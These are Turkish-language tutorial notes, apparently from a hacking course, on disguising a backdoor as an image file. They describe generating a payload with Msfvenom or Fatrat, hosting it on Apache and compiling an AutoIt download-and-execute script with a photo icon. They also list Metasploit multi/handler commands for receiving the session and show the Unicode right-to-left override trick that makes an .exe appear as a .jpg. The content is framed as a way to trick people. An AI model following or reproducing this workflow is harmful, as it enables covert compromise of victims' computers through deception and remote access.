- 🎭 İnsanları kandırmanın yollarından biri → **ilgi çekici bir resim dosyası** paylaşıp arka planda **backdoor** çalıştırmaktır.
    

---

### 🔑 Gerekli Olanlar

- 🖼️ **Fotoğraf** (hedefe gönderilecek)
    
- 🗂️ **Icon dosyası** (fotoğraf → icon formatına dönüştürülür)
    
- 💻 **Backdoor** (Msfvenom veya Fatrat ile oluşturulur)
    

👉 Bu 3 dosya `/var/www/html/` içindeki bir klasöre atılır → **Apache** ile sunucu olarak yayınlanır.

---

### ⚙️ Birleştirme (Windows Üzerinde)

1. 📥 **AutoIt** indir ve kur.
    
2. 📂 Şu repoyu indir:
    
    ```
    https://github.com/atilsamancioglu/TrojanFactory.git
    ```
    
3. 📝 `autoit-download-and-execute.txt` dosyasını masaüstüne al ve düzenle:
    
    - 📎 **URL kısımlarına**: fotoğrafın ve backdoor’un adreslerini yaz.
        
    - 🎨 Dönüştürülmüş ikon dosyasını indir.
        
4. 🛠️ **Compile Script to Exe** aracını aç:
    
    - **Source** → masaüstündeki script
        
    - **Icon** → seçilen icon dosyası
        
    - 🔄 **Convert et** → artık **fotoğraf görünümlü backdoor** hazır!
        

---

### 🖥️ Bağlantı Alma

- Kali Linux’ta:
    
    ```bash
    msfconsole
    use multi/handler
    set payload ...
    set LHOST ...
    set LPORT ...
    exploit -j -z
    sessions -l
    sessions 1
    ```
    
- ✅ Hedef dosyayı açtığında → arka planda backdoor çalışır.
    
- 🎯 Multi Handler → **session açılır** ve hedef bilgisayara bağlanılır.
    

---

### 🔮 Uzantı Gizleme Hilesi

1. 🌐 [unicode-explorer.com/c/202E](https://unicode-explorer.com/c/202E) → `Copy` seçeneğine tıkla.
    
2. 📝 Dosya adını düzenle:
    
    - Örn: `androidgpj.exe`
        
    - `gpj.exe` kısmını seç → kopyalanan karakteri yapıştır → `jpg.exe` gibi görünür.
        
3. 📸 Sonuç: Dosya aslında `.exe` iken, kullanıcıya **jpg resmi gibi görünür**.
    

---

💡 **Özet:**

- Fotoğraf + Icon + Backdoor = 🎭 **Kandırıcı dosya**
    
- Açıldığında arka planda **backdoor çalışır**
    
- Uzantı hilesi ile kullanıcıya **jpg gibi gösterilir**
